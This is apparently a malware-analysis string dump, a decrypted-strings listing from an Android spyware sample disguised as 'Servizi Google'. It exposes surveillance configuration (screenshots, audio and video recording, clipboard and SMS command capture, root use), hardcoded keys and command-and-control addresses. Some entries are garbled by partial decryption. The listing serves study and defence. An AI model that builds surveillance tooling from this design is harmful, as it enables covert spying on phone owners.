class="line">1001</div><div class="line">1002</div><div class="line">1003</div><div class="line">1004</div><div class="line">1005</div><div class="line">1006</div><div class="line">1007</div><div class="line">1008</div><div class="line">1009</div><div class="line">1010</div><div class="line">1011</div><div class="line">1012</div><div class="line">1013</div><div class="line">1014</div><div class="line">1015</div><div class="line">1016</div><div class="line">1017</div><div class="line">1018</div><div class="line">1019</div><div class="line">1020</div><div class="line">1021</div><div class="line">1022</div><div class="line">1023</div><div class="line">1024</div><div class="line">1025</div><div class="line">1026</div><div class="line">1027</div><div class="line">1028</div><div class="line">1029</div><div class="line">1030</div><div class="line">1031</div><div class="line">1032</div><div class="line">1033</div><div class="line">1034</div><div class="line">1035</div><div class="line">1036</div></pre></td><td class="code"><pre><div class="line">Dalvik Decryptor loaded...</div><div class="line">0x148f4 : alarm</div><div class="line">0x149b6 : android.intent.action.MAIN</div><div class="line">0x14a00 : android.intent.extra.shortcut.INTENT</div><div class="line">0x14a16 : android.intent.extra.shortcut.NAME</div><div class="line">0x14a26 : Servizi Google</div><div class="line">0x14a3c : com.android.launcher.action.UNINSTALL_SHORTCUT</div><div class="line">0x14aee : Error starting execution. Step 2</div><div class="line">0x14b08 : Error starting execution. Step 1</div><div class="line">0x14b9a : Error on service create.</div><div class="line">0x14c82 : android.intent.action.PACKAGE_REMOVED</div><div class="line">0x14caa : package:</div><div class="line">0x14d00 : Error while enabling component.</div><div class="line">0x14d58 : android.intent.action.SCRE??AFD_</div><div class="line">0x14d86 : android.intent.action.USER_PRESENT</div><div class="line">0x14da6 : android.intent.action.SCREEN_ON</div><div class="line">0x151bc : Warning, interrupt received while getting writer lock.</div><div class="line">0x152d0 : Error loading action registry</div><div class="line">0x152ea : Error loading executed action registry</div><div class="line">0x153ce : Error testing actions registry load.</div><div class="line">0x153e8 : Error writing action registry</div><div class="line">0x15598 : Error purging action registry</div><div class="line">0x1571e : Error writing executed action registry</div><div class="line">0x157b2 : Warning, interrupt received while getting writer lock.</div><div class="line">0x15b70 : phone</div><div class="line">0x15ba6 :  IMEI:</div><div class="line">0x15bf4 :  IMSI:</div><div class="line">0x15c54 :  Board:</div><div class="line">0x15c76 :  Brand:</div><div class="line">0x15c9a :  Device:</div><div class="line">0x15d00 : Release:</div><div class="line">0x15d22 :  CodeName:</div><div class="line">0x15d46 :  Inc:</div><div class="line">0x15d6a :  SDK:</div><div class="line">0x15e6a : Error writing identity file</div><div class="line">0x15f02 : Error loading identity file</div><div class="line">0x15f40 : ef7r2rq4o0pj5vxm</div><div class="line">0x15f50 : UTF-8</div><div class="line">0x15f6c : dgki673eby</div><div class="line">0x15f7c : UTF-8</div><div class="line">0x15fa8 : cb67k9q2r5d4h6f4</div><div class="line">0x15fb8 : UTF-8</div><div class="line">0x15fd0 : AES</div><div class="line">0x15fec : PBKD??;H`/a_tjz\J</div><div class="line">0x16006 : astr63k9bzq1pyiefnkxdl56uefrtysw</div><div class="line">0x16044 : AES</div><div class="line">0x16060 : Error creating key</div><div class="line">0x16128 : AES/CBC/PKCS5Padding</div><div class="line">0x1618c : UTF-8</div><div class="line">0x161dc : AES/CBC/PKCS5Padding</div><div class="line">0x16282 : RSA</div><div class="line">0x162a2 : RSA/ECB/PKCS1PADDING</div><div class="line">0x162c2 : UTF-8</div><div class="line">0x16470 : TLS</div><div class="line">0x164b8 : allowAllSSL</div><div class="line">0x164d8 : allowAllSSL</div><div class="line">0x166ba : POST</div><div class="line">0x166d0 : Connection</div><div class="line">0x166e0 : Keep-Alive</div><div class="line">0x16706 : Content-Type</div><div class="line">0x16716 : application/json</div><div class="line">0x1672c : Accept</div><div class="line">0x1673c : application/json</div><div class="line">0x168e6 : UTF-8</div><div class="line">0x1690a : http</div><div class="line">0x16936 : https</div><div class="line">0x16b34 : POST</div><div class="line">0x16b4a : Connection</div><div class="line">0x16b5a : Keep-Alive</div><div class="line">0x16b70 : Content-Type</div><div class="line">0x16b80 : application/json</div><div class="line">0x16b96 : Accept</div><div class="line">0x16ba6 : application/json</div><div class="line">0x16e18 : POST</div><div class="line">0x16e2e : Connection</div><div class="line">0x16e3e : Keep-Alive</div><div class="line">0x16e68 : Content-Type</div><div class="line">0x16e78 : application/octet-stream</div><div class="line">0x16e9c : Content-Type</div><div class="line">0x16eaa : multipart/form-data</div><div class="line">0x17032 : Input zip file parameter is not null</div><div class="line">0x170ba : internal error: zip model is null</div><div class="line">0x170ee : This is a split archive. Zip file format does not allow updating split/spanned files</div><div class="line">0x171e0 : zip file does not exist</div><div class="line">0x17206 : Invalid mode</div><div class="line">0x172b2 : no read access for the input zip file</div><div class="line">0x1737c : internal error: zip model is null</div><div class="line">0x173a0 : input parameters are null, cannot add files to zip</div><div class="line">0x173cc : invalid operation - Zip4j is in busy state</div><div class="line">0x173ec : input file ArrayList is null, cannot add files</div><div class="line">0x17416 : One or more elements in the input ArrayList is not of type File</div><div class="line">0x17452 : Zip file already exists. Zip file format does not allow updating split/spanned files</div><div class="line">0x174b0 : input path is null, cannot add folder to zip file</div><div class="line">0x174d4 : input parameters are null, cannot add folder to zip file</div><div class="line">0x17524 : input path is null or empty, cannot add folder to zip file</div><div class="line">0x1757c : inputstream is null, cannot add file to zip</div><div class="line">0x175bc : Zip file already exists. Zip file format does not allow updating split/spanned files</div><div class="line">0x17604 : internal error: zip model is null</div><div class="line">0x17624 : zip parameters are null</div><div class="line">0x17734 : zip file path is empty</div><div class="line">0x17764 : zip file:</div><div class="line">0x17786 :  already exists. To add files to existing zip file use addFile method</div><div class="line">0x177d8 : input file ArrayList is null, cannot create zip file</div><div class="line">0x17802 : One or more elements in the input ArrayList is not of type File</div><div class="line">0x17834 : folderToAdd is null, cannot create zip file from folder</div><div class="line">0x1788c : zip file:</div><div class="line">0x178ae :  already exists. To add files to existing zip file use addFolder method</div><div class="line">0x178de : input parameters are null, cannot create zip file from folder</div><div class="line">0x17918 : folderToAdd is empty or null, cannot create Zip File from folder</div><div class="line">0x179b0 : output path is null or invalid</div><div class="line">0x179e2 : Internal error occurred when extracting zip file</div><div class="line">0x17a28 : invalid output path</div><div class="line">0x17a56 : invalid operation - Zip4j is in busy state</div><div class="line">0x17af0 : file to extract is null or empty, cannot extract file</div><div class="line">0x17b36 : destination string path is empty or null, cannot extract file</div><div class="line">0x17b68 : file header not found for given file name, cannot extract file</div><div class="line">0x17b96 : invalid operation - Zip4j is in busy state</div><div class="line">0x17c38 : input file header is null, cannot extract file</div><div class="line">0x17c70 : invalid operation - Zip4j is in busy state</div><div class="line">0x17c96 : destination path is empty or null, cannot extract file</div><div class="line">0x17d24 : windows-1254</div><div class="line">0x17d40 : windows-1254</div><div class="line">0x17d72 : zip model is null, cannot read comment</div><div class="line">0x17df0 : zip file does not exist, cannot read comment</div><div class="line">0x17e1c : end of central directory record is null, cannot read comment</div><div class="line">0x17ea6 : input file name is emtpy or null, cannot get FileHeader</div><div class="line">0x17f74 : FileHeader is null, cannot get InputStream</div><div class="line">0x17fa4 : zip model is null, cannot get inputstream</div><div class="line">0x18062 : Zip Model is null</div><div class="line">0x180a6 : invalid zip file</div><div class="line">0x18156 : Zip Model is null</div><div class="line">0x181dc : outputZipFile is null, cannot merge split files</div><div class="line">0x18204 : output Zip File already exists</div><div class="line">0x1822c : zip model is null, corrupt zip file?</div><div class="line">0x18290 : file name is empty or null, cannot remove file</div><div class="line">0x182e2 : Zip file format does not allow updating split/spanned files</div><div class="line">0x18312 : could not find file header for file:</div><div class="line">0x18358 : file header is null, cannot remove file</div><div class="line">0x183a2 : Zip file format does not allow updating split/spanned files</div><div class="line">0x18400 : input comment is null, cannot update zip file</div><div class="line">0x1842c : zip file does not exist, cannot set comment for zip file</div><div class="line">0x18456 : zipModel is null, cannot update zip file</div><div class="line">0x18498 : end of central directory is null, cannot set comment</div><div class="line">0x184d0 : null or empty charset name</div><div class="line">0x18500 : unsupported charset:</div><div class="line">0x185ba : Zip Model is null</div><div class="line">0x18622 : invalid zip file</div><div class="line">0x187d6 : 9999</div><div class="line">0x1887e : .HH</div><div class="line">0x188bc : UTF-8</div><div class="line">0x189ea : Error while closing zip header file stream</div><div class="line">0x18a0e : Error while closing zip header file stream</div><div class="line">0x18cca : com.android.settings</div><div class="line">0x18cfe : com.android.settings.widget.SettingsAppWidgetProvider</div><div class="line">0x18d54 : mounted</div><div class="line">0x18dda : Error</div><div class="line">0x18eb6 : Error</div><div class="line">0x18f50 : audio</div><div class="line">0x18fae : STREAM_</div><div class="line">0x19054 : connectivity</div><div class="line">0x190ac : phone</div><div class="line">0x190e0 : getITelephony</div><div class="line">0x1912a : enableDataConnectivity</div><div class="line">0x19158 : disableDataConnectivity</div><div class="line">0x1917e : connectivity</div><div class="line">0x191b2 : mService</div><div class="line">0x191f0 : setMobileDataEnabled</div><div class="line">0x1924c : location_providers_allowed</div><div class="line">0x19264 : gps</div><div class="line">0x1928a : com.android.settings</div><div class="line">0x19298 : com.android.settings.widget.SettingsAppWidgetProvider</div><div class="line">0x192ae : android.intent.category.ALTERNATIVE</div><div class="line">0x192f8 : location_providers_allowed</div><div class="line">0x19310 : gps</div><div class="line">0x19336 : com.android.settings</div><div class="line">0x19346 : com.android.settings.widget.SettingsAppWidgetProvider</div><div class="line">0x1935c : android.intent.category.ALTERNATIVE</div><div class="line">0x193dc : [##]</div><div class="line">0x19440 : [#]</div><div class="line">0x19476 : :</div><div class="line">0x1949c : date</div><div class="line">0x195fa : UTF-8</div><div class="line">0x1961e : Error while deserializing</div><div class="line">0x19674 : Error reading serialized stream: file not exists</div><div class="line">0x196a4 : Error reading serialized stream: file len is bigger than int max value</div><div class="line">0x196ce : Error reading serialized stream: file has zero len</div><div class="line">0x196e8 : Error reading serialized stream: len of byte read not equal to file len</div><div class="line">0x197ba : datas</div><div class="line">0x197fc : .tmp</div><div class="line">0x19832 : Error reading serialized stream: file not exists. Filename:</div><div class="line">0x19856 :  Old file is present:</div><div class="line">0x1987c :  old file len:</div><div class="line">0x198b2 : Renaming old file!!!</div><div class="line">0x198f2 : .tmp</div><div class="line">0x19926 : Error reading serialized stream: file has zero len:</div><div class="line">0x1994c :  Old file is present:</div><div class="line">0x19974 :  old file len:</div><div class="line">0x199aa : Renaming old file!!!</div><div class="line">0x19a0c : Error reading serialized stream: len of byte read not equal to file len</div><div class="line">0x19a3a : Error reading serialized stream: file has zero len:</div><div class="line">0x19a9c : ??gyre-)pnqrc0=xpm&lt;jq~w~1/for&lt;f/?sb1r-uzu~u~n&amp;15Mt;hutbpa</div><div class="line">0x19bc8 : UTF-8</div><div class="line">0x19c9a : .tmp</div><div class="line">0x19cd2 : datas</div><div class="line">0x19d3a : Binary serialization testing: error reading serialized stream: file not exists. Filename:</div><div class="line">0x19d86 : Binary serialization testing: error reading serialized stream: file has zero len. Filename:</div><div class="line">0x19dac :  Len:</div><div class="line">0x1a0fa : KB</div><div class="line">0x1a114 : MB</div><div class="line">0x1a46c : yyyy.MM.dd_HH.mm.ss</div><div class="line">0x1a4bc : [.][^.]+$</div><div class="line">0x1a642 : activity</div><div class="line">0x1a6de : alarm</div><div class="line">0x1a7c0 : ToExecute</div><div class="line">0x1a7e2 : Executing</div><div class="line">0x1a804 : Executed</div><div class="line">0x1a826 : ??w|h,cl^v]3Lekd</div><div class="line">0x1a848 : Finished</div><div class="line">0x1aa34 : Immediate</div><div class="line">0x1aa56 : Scheduled</div><div class="line">0x1aa78 : Programmed</div><div class="line">0x1ac0c : Field</div><div class="line">0x1ac2e : Property</div><div class="line">0x1ac4e : Method</div><div class="line">0x1ad9c : Windows</div><div class="line">0x1adbe : WindowsPhone7</div><div class="line">0x1adde : Windows8</div><div class="line">0x1adfe : Windows8RT</div><div class="line">0x1ae20 : WindowsPhone8</div><div class="line">0x1ae42 : Android</div><div class="line">0x1ae64 : IOS</div><div class="line">0x1ae82 : MacOs</div><div class="line">0x1aea2 : Linux</div><div class="line">0x1b146 : Error loading assembly registry</div><div class="line">0x1b2aa : .zip</div><div class="line">0x1b344 : data</div><div class="line">0x1b5c0 : data</div><div class="line">0x1b612 : .dex</div><div class="line">0x1b654 : .zip</div><div class="line">0x1b87c : Error loading components registry</div><div class="line">0x1bf16 : @@SUPPORT_ACTIVITY_DELEGATE_INTENT_EXTRA_NAME</div><div class="line">0x1c0cc : power</div><div class="line">0x1c2cc : @@SUPPORT_ACTIVITY_DELEGATE_INT??[_BRUGNJUL</div><div class="line">0x1c670 : stservice.dat</div><div class="line">0x1c6a0 : Error writing settings file</div><div class="line">0x1c710 : ActionServiceURLSuffix</div><div class="line">0x1c75c : ActionsDownloadServiceURLSuffix</div><div class="line">0x1c7a8 : ActionsExecutorManagerSleep</div><div class="line">0x1c7f4 : ActionsExecutorTransfererSleep</div><div class="line">0x1c840 : ActionsToExecuteRegistryFileName</div><div class="line">0x1c88c : ActivityMonitorSleep</div><div class="line">0x1c8e0 : AssemblyRegistryFileName</div><div class="line">0x1c92c : AudioFileMaxDim</div><div class="line">0x1c978 : AudioMonitorDefaultBatteyLevel</div><div class="line">0x1c9c4 : AudioMonitorDefaultFreeSpaceLevel</div><div class="line">0x1ca10 : AudioMonitorDefaultSleep</div><div class="line">0x1ca5c : ClipboardCaptureSleep</div><div class="line">0x1caa8 : CommunicationRetrySleep</div><div class="line">0x1cafc : CommunicationRetryTimes</div><div class="line">0x1cb50 : ComponentsRegistryFileName</div><div class="line">0x1cb9c : Connection??`6lxl</div><div class="line">0x1cbe8 : DataKeyEx</div><div class="line">0x1cc34 : DataKeyMod</div><div class="line">0x1cc80 : DataKeyLen</div><div class="line">0x1cccc : DelayTimeToDeactivateDataConnection</div><div class="line">0x1cd24 : ErrorLogWriterSleep</div><div class="line">0x1cd70 : ErrorLoggerRetryTimes</div><div class="line">0x1cdbc : ErrorLoggerRetryTimesSleep</div><div class="line">0x1ce08 : ErrorLoggerServiceURLSuffix</div><div class="line">0x1ce54 : ExecutedActionsRegistryFileName</div><div class="line">0x1ceb0 : --</div><div class="line">0x1cedc : FileSystemOperationsFilePriority</div><div class="line">0x1cf28 : FileSystemStructureFileExt</div><div class="line">0x1cf74 : FileTransfererFilesCountToRefresh</div><div class="line">0x1cfc0 : FileTransfererSleep</div><div class="line">0x1d00c : FileUploadBufferSize</div><div class="line">0x1d058 : FileZipperFilesCountToRefresh</div><div class="line">0x1d0a4 : FileZipperSleep</div><div class="line">0x1d0f0 : FreeSpaceMonitorAlertFreeSpace</div><div class="line">0x1d148 : FreeSpaceMonitorMinFreeSpace</div><div class="line">0x1d19c : FreeSpace??:udcrympjq;bxtp?^g|h</div><div class="line">0x1d1f4 : FreeSpaceMonitorSleep</div><div class="line">0x1d27c : IdentityHolderFileName</div><div class="line">0x1d2c8 : LeaID</div><div class="line">0x1d314 : LogErrorOnFile</div><div class="line">0x1d360 : LogErrorOnFileToUpload</div><div class="line">0x1d3ac : LogErrorOnRemoteServer</div><div class="line">0x1d3f8 : LogFileBgColor</div><div class="line">0x1d444 : LogFileExtension</div><div class="line">0x1d490 : LogWriterSleep</div><div class="line">0x1d4dc : LoggerZipProducerSleep</div><div class="line">0x1d528 : MaxActionsToGetEachTime</div><div class="line">0x1d574 : MaxActionsToSendEachTime</div><div class="line">0x1d5c0 : MediaRecorderMonitorSleep</div><div class="line">0x1d60c : RealTimeCaptureFilePriority</div><div class="line">0x1d658 : RollsLog??q]~[Ll8fy]</div><div class="line">0x1d6a4 : ScreenShotActiveWindowCaptureSleep</div><div class="line">0x1d6f0 : ScreenShotAppListSeparator</div><div class="line">0x1d744 : ScreenShotAppsListForActiveWindow</div><div class="line">0x1d790 : ScreenShotCaptureSleep</div><div class="line">0x1d7dc : ScreenShotCaptureSleepInStandbyMode</div><div class="line">0x1d828 : ScreenShotFullScreenCounter</div><div class="line">0x1d874 : ScreenShotInnerSleep</div><div class="line">0x1d8c0 : ScreenShotTimeToEnterInStandbyMode</div><div class="line">0x1d90c : ServerAlternateUrls</div><div class="line">0x1d958 : ServerBaseURL</div><div class="line">0x1d9a4 : ServerMaxFailureConnections</div><div class="line">0x1d9f0 : SettingsChangerServiceURLSuffix</div><div class="line">0x1da34 : stservice.dat</div><div class="line">0x1da60 : SettingsID</div><div class="line">0x1daac : SmsComponentOnActivation</div><div class="line">0x1daf8 : SmsInputNumbers</div><div class="line">0x1db44 : SmsManagerActivateOnStart</div><div class="line">0x1db90 : SmsOutputNumbers</div><div class="line">0x1dbdc : TimeToPersistBeforePrimaryServerSwitch</div><div class="line">0x1dc28 : TransferDir</div><div class="line">0x1dc74 : TransferExt</div><div class="line">0x1dcb8 : __</div><div class="line">0x1dce4 : TryOriginalSuOnCustomSuFailure</div><div class="line">0x1dd30 : UploadServiceURLSuffix</div><div class="line">0x1dd7c : UploadServiceUseAlternateContentType</div><div class="line">0x1ddc8 : UserLogFile??-|do~y</div><div class="line">0x1de14 : VideoFileMaxDim</div><div class="line">0x1de60 : WorkingDir</div><div class="line">0x1deac : ZipCompressionMethod</div><div class="line">0x1dfc6 : stservice.dat</div><div class="line">0x1e020 : assets/gerDrfeYugefwer</div><div class="line">0x1e066 : ServerBaseURL</div><div class="line">0x1e076 : ServerBaseURL</div><div class="line">0x1e086 : Server Base URL</div><div class="line">0x1e0cc : Error loading config file.</div><div class="line">0x1e11c : Error loading settings file</div><div class="line">0x1e1e8 : 3A1,EA26c7-9wT8-4h54-6y59-7EA4BE-3C??&apos;$.</div><div class="line">0x1e2a8 : Android/data/com.google.android.app</div><div class="line">0x1e2e4 : SettingsID</div><div class="line">0x1e2f4 : SettingsID</div><div class="line">0x1e304 : Identification of this collection of settings</div><div class="line">0x1e312 : 2D1A26C7-9DB5-4C54-8A24-7EA4BE3CB37A</div><div class="line">0x1e340 : AppVersion</div><div class="line">0x1e350 : AppVersion</div><div class="line">0x1e360 : Application version number</div><div class="line">0x1e370 : 6.1.0 obf - bulk</div><div class="line">0x1e39e : LeaID</div><div class="line">0x1e3ae : LeaID</div><div class="line">0x1e3be : Lea Identification</div><div class="line">0x1e3cc : 00000000-0000-0000-0000-000000000000</div><div class="line">0x1e3fa : DataKeyMod</div><div class="line">0x1e40a : DataKeyMod</div><div class="line">0x1e41a : Data Key Mod</div><div class="line">0x1e428 : SfYo[CNXW\AKO\XYGm,@jeCxEzv(xNnED&apos;m$_d[^`u&gt;`dJlo~zLGdy&gt;I#y8Q</div><div class="line">X_xwgVfjtx;~K@*s2U[]Zb*gDv#\#njr1??]~q	OCvar!-Lx-&apos;@(T;#jzpy&apos;m=F[wgFNCCxD(</div><div class="line">RKq(^I,^=[mu_$</div><div class="line">l|!s	[Ioo</div><div class="line">0x1e456 : DataKeyEx</div><div class="line">0x1e466 : DataKeyEx</div><div class="line">0x1e476 : Data Key Ex</div><div class="line">0x1e484 : AQAB</div><div class="line">0x1e4b2 : DataKeyLen</div><div class="line">0x1e4c2 : DataKeyLen</div><div class="line">0x1e4d2 : Data Key Len</div><div class="line">0x1e50a : WorkingDir</div><div class="line">0x1e51a : WorkingDir</div><div class="line">0x1e528 : Work directory on SD</div><div class="line">0x1e55e : ConnectionTimeout</div><div class="line">0x1e56e : ConnectionTimeout</div><div class="line">0x1e57e : Connection Timeout in milliseconds</div><div class="line">0x1e5ba : CommunicationRetryTimes</div><div class="line">0x1e5ca : CommunicationRetryTimes</div><div class="line">0x1e5da : Communication Retry Times on Errors</div><div class="line">0x1e612 : CommunicationRetrySleep</div><div class="line">0x1e620 : CommunicationRetrySleep</div><div class="line">0x1e630 : Communication Retry Sleep in milliseconds</div><div class="line">0x1e66a : AssemblyRegistryFileName</div><div class="line">0x1e67a : AssemblyRegistryFileName</div><div class="line">0x1e68a : Assembly Registry File Name</div><div class="line">0x1e69a : arservice.dat</div><div class="line">0x1e6c8 : LogErrorOnFile</div><div class="line">0x1e6d8 : LogErrorOnFile</div><div class="line">0x1e6e6 : Log Errors On ??`s</div><div class="line">0x1e71e : LogErrorOnRemoteServer</div><div class="line">0x1e72e : LogErrorOnRemoteServer</div><div class="line">0x1e73e : Log Error On Remote Server</div><div class="line">0x1e776 : LogErrorOnFileToUpload</div><div class="line">0x1e784 : LogErrorOnFileToUpload</div><div class="line">0x1e794 : Log Error in local file uploaded on Remote Server</div><div class="line">0x1e7cc : ErrorLoggerServiceURLSuffix</div><div class="line">0x1e7dc : ErrorLoggerServiceURLSuffix</div><div class="line">0x1e7ec : Error Logger Service URL</div><div class="line">0x1e7fc : UlisseREST/api/log/</div><div class="line">0x1e82a : ErrorLoggerRetryTimes</div><div class="line">0x1e83a : ErrorLoggerRetryTimes</div><div class="line">0x1e84a : Error Logger Retry Times of Web Service</div><div class="line">0x1e882 : ErrorLoggerRetryTimesSleep</div><div class="line">0x1e892 : ErrorLoggerRetryTimesSleep</div><div class="line">0x1e8a2 : ??]kd+7Etnxl))E|kvy_pzlh)e~l</div><div class="line">0x1e8dc : ErrorLogWriterSleep</div><div class="line">0x1e8ec : ErrorLogWriterSleep</div><div class="line">0x1e8fc : Error Log Writer Sleep</div><div class="line">0x1e936 : ActionsExecutorManagerSleep</div><div class="line">0x1e946 : ActionsExecutorManagerSleep</div><div class="line">0x1e956 : Actions Executor Manager Sleep</div><div class="line">0x1e990 : ActionsExecutorTransfererSleep</div><div class="line">0x1e9a0 : ActionsExecutorTransfererSleep</div><div class="line">0x1e9b0 : Actions ??mn~by4g/Ail9nmpm0y=Da~0</div><div class="line">0x1e9ec : MaxActionsToGetEachTime</div><div class="line">0x1e9fc : MaxActionsToGetEachTime</div><div class="line">0x1ea0c : Max Actions To Get Each Time</div><div class="line">0x1ea46 : MaxActionsToSendEachTime</div><div class="line">0x1ea56 : MaxActionsToSendEachTime</div><div class="line">0x1ea66 : Max Executed Actions To Send Each Time</div><div class="line">0x1ea9e : ActionServiceURLSuffix</div><div class="line">0x1eaae : ActionServiceURLSuffix</div><div class="line">0x1eabe : Action Service URL Suffix</div><div class="line">0x1eace : UlisseREST/api/actions/</div><div class="line">0x1eafc : ActionsToExecuteRegistryFileName</div><div class="line">0x1eb0c : ActionsToExecuteRegistryFileName</div><div class="line">0x1eb1c : Actions To Execute Registry FileName</div><div class="line">0x1eb2a : acservice</div><div class="line">0x1eb58 : ExecutedActions??~j~.gfSb1r??o</div><div class="line">0x1eb68 : ExecutedActionsRegistryFileName</div><div class="line">0x1eb78 : Executed Actions Registry FileName</div><div class="line">0x1eb88 : easervice</div><div class="line">0x1ebb6 : AudioFileMaxDim</div><div class="line">0x1ebc6 : AudioFileMaxDim</div><div class="line">0x1ebd6 : Max audio file dimension in bytes</div><div class="line">0x1ec12 : VideoFileMaxDim</div><div class="line">0x1ec22 : VideoFileMaxDim</div><div class="line">0x1ec32 : Max video file dimension in bytes</div><div class="line">0x1ec6e : MediaRecorderMonitorSleep</div><div class="line">0x1ec7e : MediaRecorderMonitorSleep</div><div class="line">0x1ec8e : MediaRecorder monitor/split thread sleep time in mills</div><div class="line">0x1ecc8 : AudioMonitorDefaultBattey??rkn</div><div class="line">0x1ecd8 : AudioMonitorDefaultBatteyLevel</div><div class="line">0x1ece8 : Audio monitor default battery level (o/o)</div><div class="line">0x1ed20 : AudioMonitorDefaultFreeSpaceLevel</div><div class="line">0x1ed30 : AudioMonitorDefaultFreeSpaceLevel</div><div class="line">0x1ed40 : Audio monitor default free space level (bytes)</div><div class="line">0x1ed7c : AudioMonitorDefaultSleep</div><div class="line">0x1ed8c : AudioMonitorDefaultSleep</div><div class="line">0x1ed9c : Audio monitor default thread sleep time in mills</div><div class="line">0x1edd8 : FileTransfererSleep</div><div class="line">0x1ede8 : FileTransfererSleep</div><div class="line">0x1edf8 : File Transferer Sleep</div><div class="line">0x1ee34 : FileTransfererFilesCountToRefresh</div><div class="line">0x1ee44 : FileTransfererFilesCountToRefresh</div><div class="line">0x1ee54 : File Transferer number of files to trasfer before refresh</div><div class="line">0x1ee8e : FileUploadBufferSize</div><div class="line">0x1ee9e : FileUploadBufferSize</div><div class="line">0x1eeae : File Upload Buffer Size</div><div class="line">0x1eee8 : FileZipperSleep</div><div class="line">0x1eef6 : FileZipperSleep</div><div class="line">0x1ef06 : File Zipper Sleep</div><div class="line">0x1ef40 : FileZipperFilesCountToRefresh</div><div class="line">0x1ef50 : ??byzOb-ghiSf9~~Tr~;kAdO2kip|</div><div class="line">0x1ef60 : File Zipper number of files to zip before refresh</div><div class="line">0x1ef9a : LoggerZipProducerSleep</div><div class="line">0x1efaa : LoggerZipProducerSleep</div><div class="line">0x1efba : Logger Zip Producer Sleep</div><div class="line">0x1eff6 : ServerBaseURL</div><div class="line">0x1f006 : ServerBaseURL</div><div class="line">0x1f016 : Server Base URL</div><div class="line">0x1f026 : https://68.233.237.11/</div><div class="line">0x1f054 : ServerAlternateUrls</div><div class="line">0x1f064 : ServerAlternateUrls</div><div class="line">0x1f074 : Server Alternate URLs (separated by ;)</div><div class="line">0x1f082 : https://68.233.237.11/;https://66.232.100.221:8443/</div><div class="line">0x1f0b0 : Server??&gt;q]h~u~+jZdwyl8</div><div class="line">0x1f0c0 : ServerMaxFailureConnections</div><div class="line">0x1f0d0 : Max number of failures before to switch url</div><div class="line">0x1f10a : TimeToPersistBeforePrimaryServerSwitch</div><div class="line">0x1f11a : TimeToPersistBefore??m|f&lt;etHp</div><div class="line">0x1f12a : Time (in mills) before to switch to base url</div><div class="line">0x1f166 : IdentityHolderFileName</div><div class="line">0x1f176 : IdentityHolderFileName</div><div class="line">0x1f186 : Identity ??`yhe</div><div class="line">0x1f196 : idservice</div><div class="line">0x1f1c2 : UploadServiceURLSuffix</div><div class="line">0x1f1d2 : UploadServiceURLSuffix</div><div class="line">0x1f1e0 : Upload Service URL Suffix</div><div class="line">0x1f1f0 : UlisseWCF/UploadService.svc/UploadFile</div><div class="line">0x1f21e : UploadServiceUseAlternateContentType</div><div class="line">0x1f22e : UploadServiceUseAlternateContentType</div><div class="line">0x1f23e : Use alternate content-type for upload</div><div class="line">0x1f276 : TransferDir</div><div class="line">0x1f286 : TransferDir</div><div class="line">0x1f296 : Transfer Dir</div><div class="line">0x1f2a6 : trf</div><div class="line">0x1f2d2 : TransferExt</div><div class="line">0x1f2e2 : TransferExt</div><div class="line">0x1f2f2 : Transfer Ext</div><div class="line">0x1f302 : trf</div><div class="line">0x1f330 : RequestConnectionTimeout</div><div class="line">0x1f340 : RequestConnectionTimeout</div><div class="line">0x1f350 : Request Connection Timeout</div><div class="line">0x1f38c : FileSystemStructureFileExt</div><div class="line">0x1f39a : FileSystemStructureFileExt</div><div class="line">0x1f3aa : File System Structure File Ext</div><div class="line">0x1f3ba : fs</div><div class="line">0x1f3e8 : SettingsChangerServiceURLSuffix</div><div class="line">0x1f3f8 : SettingsChangerServiceURLSuffix</div><div class="line">0x1f408 : Settings Changer Service URL Suffix</div><div class="line">0x1f418 : UlisseREST/api/settings/</div><div class="line">0x1f446 : ActionsDownloadServiceURLSuffix</div><div class="line">0x1f456 : ActionsDownloadServiceURLSuffix</div><div class="line">0x1f466 : Actions Download Service URL Suffix</div><div class="line">0x1f476 : UlisseREST/api/downloadaction/</div><div class="line">0x1f4a4 : UserLogFilePriority</div><div class="line">0x1f4b4 : UserLogFilePriority</div><div class="line">0x1f4c4 : User Log file priority</div><div class="line">0x1f4fe : FileSystemOperationsFilePriority</div><div class="line">0x1f50e : FileSystemOperationsFilePriority</div><div class="line">0x1f51e : File system operations output file priority</div><div class="line">0x1f558 : RealTimeCaptureFilePriority</div><div class="line">0x1f568 : RealTimeCaptureFilePriority</div><div class="line">0x1f578 : Real time operations output file priority</div><div class="line">0x1f5b2 : ActivityMonitorSleep</div><div class="line">0x1f5c2 : ActivityMonitorSleep</div><div class="line">0x1f5d2 : User Activity ??pgr</div><div class="line">0x1f60c : DelayTimeToDeactivateDataConnection</div><div class="line">0x1f61c : DelayTimeToDeactivateData??</div><div class="line">0x1f62c : User Activity Monitor delay time to deactivate data connection</div><div class="line">0x1f664 : ComponentsRegistryFileName</div><div class="line">0x1f674 : ComponentsRegistryFileName</div><div class="line">0x1f684 : Components Registry File Name</div><div class="line">0x1f694 : crservice.dat</div><div class="line">0x1f6c2 : SmsComponentOnActivation</div><div class="line">0x1f6d2 : SmsComponentOnActivation</div><div class="line">0x1f6e2 : Sms Component to register when activating</div><div class="line">0x1f6f2 : com.google.android.smsCommand.SmsCommandAudio</div><div class="line">0x1f720 : SmsInputNumbers</div><div class="line">0x1f730 : SmsInputNumbers</div><div class="line">0x1f740 : Sms accepted phone numbers</div><div class="line">0x1f750 : Servizi190;Servizi3;Servizi155;Servizi119;</div><div class="line">0x1f77e : SmsOutputNumbers</div><div class="line">0x1f78e : SmsOutputNumbers</div><div class="line">0x1f79e : Sms output phone numbers</div><div class="line">0x1f7d0 : SmsManagerActivateOnStart</div><div class="line">0x1f7e0 : SmsManagerActivate??uZkh)</div><div class="line">0x1f7f0 : Activate Sms Command ??</div><div class="line">0x1f826 : TryOriginalSuOnCustomSuFailure</div><div class="line">0x1f836 : TryOriginalSuOnCustomSuFailure</div><div class="line">0x1f846 : Try to use original su command if custom su execution fails</div><div class="line">0x1f87e : FreeSpaceMonitorMinFreeSpace</div><div class="line">0x1f88c : FreeSpaceMonitorMinFreeSpace</div><div class="line">0x1f89c : Minimum free space to delete preallocation file (bytes)</div><div class="line">0x1f8d8 : FreeSpaceMonitorAlertFreeSpace</div><div class="line">0x1f8e8 : FreeSpaceMonitorAlertFreeSpace</div><div class="line">0x1f8f8 : Minimum free space to start alerts (bytes)</div><div class="line">0x1f934 : FreeSpaceMonitorPreallocatedSpace</div><div class="line">0x1f944 : FreeSpaceMonitorPreallocatedSpace</div><div class="line">0x1f954 : Space to preallocate (bytes)</div><div class="line">0x1f98e : FreeSpaceMonitorSleep</div><div class="line">0x1f99e : FreeSpaceMonitorSleep</div><div 